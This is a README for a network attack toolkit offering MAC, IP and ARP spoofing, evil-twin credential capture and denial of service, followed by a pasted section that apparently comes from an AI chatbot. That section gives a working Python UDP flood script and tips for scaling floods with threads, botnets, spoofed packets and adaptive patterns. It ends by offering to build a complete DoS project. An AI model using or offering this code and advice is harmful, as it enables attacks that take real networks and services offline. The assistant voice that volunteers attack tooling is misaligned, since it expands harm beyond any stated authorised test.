# MAC Master

MAC Master is a powerful and modular network attack toolkit designed for penetration testing and network auditing. It provides an easy-to-use CLI interface to execute various network manipulation techniques, including:

* **MAC Spoofing**: Change your MAC address for complete anonymity and bypass MAC-based security restrictions.
* **IP Spoofing**: Forge your IP address to mimic another device on the network.
* **ARP Spoofing**: Intercept network traffic by poisoning ARP tables and perform Man-in-the-Middle (MitM) attacks.
* **Evil Twin Attack**: Clone a target Wi-Fi network to capture user credentials and perform MitM attacks.
* **Denial of Service (DoS)**: Disrupt network connectivity by flooding the network with malicious traffic.

## Project Structure

```
MAC-Master/
│
├── modules/
│   ├── mac_spoofing/
│   │   ├── mac_spoof.py
│   │   └── README.md
│   ├── ip_spoofing/
│   │   ├── ip_spoof.py
│   │   └── README.md
│   ├── arp_spoofing/
│   │   ├── arp_spoof.py
│   │   └── README.md
│   ├── evil_twin/
│   │   ├── evil_twin.py
│   │   └── README.md
│   └── dos_attack/
│       ├── dos.py
│       └── README.md
│
├── core/
│   ├── cli.py
│   ├── utils.py
│   └── banner.py
│
├── requirements.txt
├── main.py
├── LICENSE
└── README.md
```

## Features

* Modular design with separate directories for each attack technique
* Easy-to-use CLI interface for quick execution
* Supports both targeted and network-wide attacks
* Compatible with Linux distributions

## Installation

```bash
# Clone the repository
git clone https://github.com/your-username/MAC-Master.git
cd MAC-Master

# Install dependencies
pip install -r requirements.txt
```

## Usage

```bash
python3 main.py
```

Follow the on-screen options to navigate through:

1. MAC Spoofing
2. IP Spoofing
3. ARP Spoofing
4. Evil Twin Attack
5. Denial of Service (DoS)

## Modules

* **MAC Spoofing:** Anonymize your device by altering its MAC address.
* **IP Spoofing:** Mask your IP address for stealth operations.
* **ARP Spoofing:** Hijack traffic between devices by poisoning ARP tables.
* **Evil Twin Attack:** Create a fake Wi-Fi AP to capture login credentials.
* **Denial of Service (DoS):** Overwhelm a network with packet floods.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

**Disclaimer:** This tool is intended for educational and authorized testing purposes only. Unauthorized use is strictly prohibited.








🧠 Basic Types of DoS via Code:
Attack Type	Language	What it Does
SYN Flood	Python / C	Sends tons of half-open TCP requests
UDP Flood	Python	Sends random UDP packets to a target port
HTTP Flood	Python	Bombards a web server with HTTP GET/POST calls
Deauth Attack (Wi-Fi)	Bash/Aircrack	Disconnects Wi-Fi clients by spoofed packets
Ping Flood	Python/C	Sends ICMP packets rapidly to choke bandwidth

🧪 Example: Simple Python UDP Flood (Educational Use Only)
python
Copy
Edit
```

import socket
import random

ip = "192.168.1.10"  # Target IP
port = 80            # Target Port
bytes_to_send = random._urandom(1024)  # Random bytes
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

while True:
    sock.sendto(bytes_to_send, (ip, port))
    print(f"Sent packet to {ip}:{port}")
```

You can stop it with Ctrl+C.

This can crash routers or services if sent at scale.

Use it only on a test machine or offline router.

🧠 Advanced Concept:
You can scale DoS with:

Multithreading

Botnets (illegal unless simulated)

Spoofed packets (IP spoofing + raw sockets)

AI-controlled attack patterns (adaptive flooding)

💡 Real-World Use-Case (Legal):
Build a DoS Protection Simulator:

Create a mock server in Flask.

Launch DoS scripts against it.

Monitor its CPU/memory response.

Log mitigation steps.

If you want, I can provide:

✅ A safe Flask web server target for testing

✅ DoS attack script (Python)

✅ Logging + detection mechanism

Let me know:
“Send me a lab-safe DoS test project” and I’ll build you a complete setup.
